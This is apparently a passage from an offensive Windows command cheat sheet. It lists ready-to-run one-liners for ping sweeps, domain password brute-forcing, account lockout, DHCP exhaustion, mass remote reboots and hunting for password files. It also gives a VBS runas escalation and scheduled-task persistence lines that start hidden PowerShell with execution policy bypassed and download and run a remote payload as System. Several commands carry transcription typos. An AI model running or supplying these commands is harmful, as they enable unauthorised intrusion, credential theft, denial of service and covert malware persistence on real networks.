for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do @ ping -n 1 -w 100 10.10.%i.%x 2>nul | find "Reply" && echo 10.10.%i.%x live.txt)
```

###  LOOP THROUGH FILE

```powershell
for /F %i in (<file>) do <command>
```

###  DOMAIN BRUTE FORCER

```powershell
for /F %n in (names.txt) do for /F %p in (pawds.txt) do net use \\DC01\IPC$ /user:<domain>\%n %p 1>NUL 2>&1 && echo %n:%p && net use /delete \\DCO1\IPC$ > NUL
```

###  ACCOUNT LOCKOUT (LOCKOUT. BAT)

```powershell
@echo Test run:
```

```powershell
for /f %%U in (list.txt) do @for /l %%C in (1,1,5) do @echo net use \\WIN-1234\c$ /USER:%%U wrongpass
```

###  DHCP EXHAUSTION

```powershell
for /L %i in (2,1,254) do (netsh interface ip set address local static 1.1.1.%i <netmask> <gw> <ID> %1 ping 127.0.0.1 -n 1 -w 10000 > nul %1)
```

###  DNS REVERSE LOOKUP

```powershell
for /L %i in (100, 1, 105) do @ nslookup 1.1.1.%i | findstr /i /c:"Name" >> dns.txt && echo Server: 1.1.1.%i >> dns.txt
```

###  SEARCH FOR FILES BEGINNING WITH THE WORD "PASS" AND THEN PRINT IF IT'S A DIRECTORY, FILE DATE/TIME, RELATIVE PATH, ACTUAL PATH AND SIZE (@VARIABLES ARE OPTIONAL)

```powershell
forfi1es /P c:\temp /s /m pass* -c "cmd /c echo @isdir @fdate @ftime @relpath @path @fsize"
```

###  SIMULATE MALICIOUS DOMAIN CALLOUTS (USEFUL FOR AV/IDS TESTING)

```powershell
#Run packet capture on attack domain to receive callout
#domains.txt should contain known malicious domains
for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n <attack domain> > NUL 2>&1 & ping -n 5 127.0.0.1 > NUL 2>&1
```

###  IE WEB LOOPER (TRAFFIC GENERATOR)

```powershell
for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U & ping -n 6 localhost & taskkill /F /IM iexplore.exe
```

###  GET PERMISSIONS ON SERVICE EXECUTABLES

```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^| find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\3afd4ga.tmp
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe /c icacls "%a"
```

###  ROLLING REBOOT (REPLACE /R WITH /S FOR A SHUTDOWN) :

```powershell
for /L %i in (2,1,254) do shutdown /r /m \\1.1.1.%i /f /t 0 /c "Reboot message"
```

###  SHELL ESCALATION USING VBS (NEED ELEVATED CREDENTIALS)

```powershell
# Create .vbs script with the following
Set shell * wscript.createobject("wscript.shell")
Shell.run "runas /user:<user> " & """" & C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -Noninteractive -ep bypass -nop -c \" & """" & "IEX ((New-Object Net.WebClient).downloadstring('<url>'))\" & """" & """"
wscript.sleep (100)
shell.Sendkeys "<password>" & "{ENTER}"
```


## Windows Task Scheduler 


*Enclose the /TR path parameter between backslash (\) AND quotation marks ("): ... /TR "\"C:\Program Files\file.exe\" -x argl"*


###  TASK SCHEDULER (ST=START TIME, SD=START DATE, ED=END DATE) *MUST BE ADMIN

```powershell
SCHTASKS /CREATE /TN <Task Name> /SC HOURLY /ST <HH:MM> /F /RL HIGHEST /SD <MM/DD/YYYY> /ED <MM/DD/YYYY> /tr "C:\my.exe" /RU <DOMAIN\user> /RP <password>
```

###  TASK SCHEDULER PERSISTENCE [10]

```powershell
#For 64 bit use:
"C:\Windows\syswow64\WindowsPowerShell\vl.0\powershell.exe"

# (x86) on User Login
SCHTASKS /CREATE /TN <Task Name> /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://<ip>:<port>/<payload>'''))'" /SC onlogon /RU System

# (x86) on System Start
SCHTASKS /CREATE /TN Task Name /TR "C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://<ip>:<port>/<payload>''))'" /SC onstart /RU System

# (x86) on User Idle (30 Minutes)
SCHTASKS /CREATE /TN Task Name /TR "C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://<ip>:<port>/<payload>''))'" /SC onidle /i 30
```

